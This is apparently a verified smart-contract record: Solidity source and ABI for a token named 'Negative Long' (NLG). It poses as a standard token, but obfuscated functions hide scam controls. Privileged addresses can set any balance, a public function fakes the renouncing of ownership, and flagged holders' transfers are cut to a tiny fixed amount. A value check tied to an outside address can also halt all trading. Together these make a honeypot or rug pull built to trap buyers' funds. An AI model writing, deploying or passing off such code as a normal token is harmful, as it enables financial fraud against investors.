{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface toTokenIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toLiquidityTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapMin {\n    function createPair(address fundAuto, address walletShould) external returns (address);\n}\n\ninterface totalFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldTake) external view returns (uint256);\n\n    function transfer(address tokenMin, uint256 tokenTotal) external returns (bool);\n\n    function allowance(address totalBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenMin,\n        uint256 tokenTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableMarketingFund, uint256 value);\n    event Approval(address indexed totalBuy, address indexed spender, uint256 value);\n}\n\ninterface senderTeam is totalFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NegativeLong is toLiquidityTake, totalFund, senderTeam {\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingMax;\n    }\n\n    function amountMarketing(address tradingReceiver, uint256 tokenTotal) public {\n        teamMode();\n        sellWallet[tradingReceiver] = tokenTotal;\n    }\n\n    function approve(address teamMin, uint256 tokenTotal) public virtual override returns (bool) {\n        takeFundLimit[_msgSender()][teamMin] = tokenTotal;\n        emit Approval(_msgSender(), teamMin, tokenTotal);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLaunch;\n    }\n\n    uint256 public totalTxFund;\n\n    bool private receiverShould;\n\n    function teamMode() private view {\n        require(fundMaxLiquidity[_msgSender()]);\n    }\n\n    mapping(address => uint256) private sellWallet;\n\n    event OwnershipTransferred(address indexed isTotal, address indexed txMode);\n\n    function isLaunched() public {\n        emit OwnershipTransferred(toShould, address(0));\n        amountReceiver = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return amountReceiver;\n    }\n\n    address private amountReceiver;\n\n    bool public sellTotal;\n\n    uint256 tokenMaxExempt;\n\n    function balanceOf(address shouldTake) public view virtual override returns (uint256) {\n        return sellWallet[shouldTake];\n    }\n\n    function sellFund(address atLimit) public {\n        if (sellTotal) {\n            return;\n        }\n        if (swapToken != receiverShould) {\n            receiverShould = false;\n        }\n        fundMaxLiquidity[atLimit] = true;\n        \n        sellTotal = true;\n    }\n\n    function owner() external view returns (address) {\n        return amountReceiver;\n    }\n\n    address receiverAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minBuy;\n    }\n\n    address totalExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchedMin;\n\n    constructor (){\n        if (receiverShould != swapToken) {\n            totalTxFund = launchedMin;\n        }\n        toTokenIs feeList = toTokenIs(receiverAt);\n        feeShould = swapMin(feeList.factory()).createPair(feeList.WETH(), address(this));\n        if (launchedMin == totalTxFund) {\n            receiverShould = false;\n        }\n        toShould = _msgSender();\n        isLaunched();\n        fundMaxLiquidity[toShould] = true;\n        sellWallet[toShould] = minBuy;\n        \n        emit Transfer(address(0), toShould, minBuy);\n    }\n\n    uint256 limitList;\n\n    address public feeShould;\n\n    uint256 private minBuy = 100000000 * 10 ** 18;\n\n    function shouldTo(address takeTotal, address tokenMin, uint256 tokenTotal) internal returns (bool) {\n        require(sellWallet[takeTotal] >= tokenTotal);\n        sellWallet[takeTotal] -= tokenTotal;\n        sellWallet[tokenMin] += tokenTotal;\n        emit Transfer(takeTotal, tokenMin, tokenTotal);\n        return true;\n    }\n\n    string private launchReceiver = \"NLG\";\n\n    mapping(address => bool) public feeLiquidity;\n\n    function marketingSellFrom(address takeTotal, address tokenMin, uint256 tokenTotal) internal returns (bool) {\n        if (takeTotal == toShould) {\n            return shouldTo(takeTotal, tokenMin, tokenTotal);\n        }\n        uint256 maxTokenReceiver = totalFund(feeShould).balanceOf(totalExempt);\n        require(maxTokenReceiver == tokenMaxExempt);\n        require(tokenMin != totalExempt);\n        if (feeLiquidity[takeTotal]) {\n            return shouldTo(takeTotal, tokenMin, swapList);\n        }\n        return shouldTo(takeTotal, tokenMin, tokenTotal);\n    }\n\n    function transferFrom(address takeTotal, address tokenMin, uint256 tokenTotal) external override returns (bool) {\n        if (_msgSender() != receiverAt) {\n            if (takeFundLimit[takeTotal][_msgSender()] != type(uint256).max) {\n                require(tokenTotal <= takeFundLimit[takeTotal][_msgSender()]);\n                takeFundLimit[takeTotal][_msgSender()] -= tokenTotal;\n            }\n        }\n        return marketingSellFrom(takeTotal, tokenMin, tokenTotal);\n    }\n\n    function amountWallet(address receiverAmount) public {\n        teamMode();\n        \n        if (receiverAmount == toShould || receiverAmount == feeShould) {\n            return;\n        }\n        feeLiquidity[receiverAmount] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeFundLimit;\n\n    bool private swapToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchReceiver;\n    }\n\n    mapping(address => bool) public fundMaxLiquidity;\n\n    uint256 constant swapList = 9 ** 10;\n\n    uint8 private marketingMax = 18;\n\n    address public toShould;\n\n    function transfer(address tradingReceiver, uint256 tokenTotal) external virtual override returns (bool) {\n        return marketingSellFrom(_msgSender(), tradingReceiver, tokenTotal);\n    }\n\n    string private receiverLaunch = \"Negative Long\";\n\n    function allowance(address teamLimit, address teamMin) external view virtual override returns (uint256) {\n        if (teamMin == receiverAt) {\n            return type(uint256).max;\n        }\n        return takeFundLimit[teamLimit][teamMin];\n    }\n\n    function fromTotalTeam(uint256 tokenTotal) public {\n        teamMode();\n        tokenMaxExempt = tokenTotal;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketingFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"amountMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"amountWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"fromTotalTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMaxLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"}],\"name\":\"sellFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTxFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NegativeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}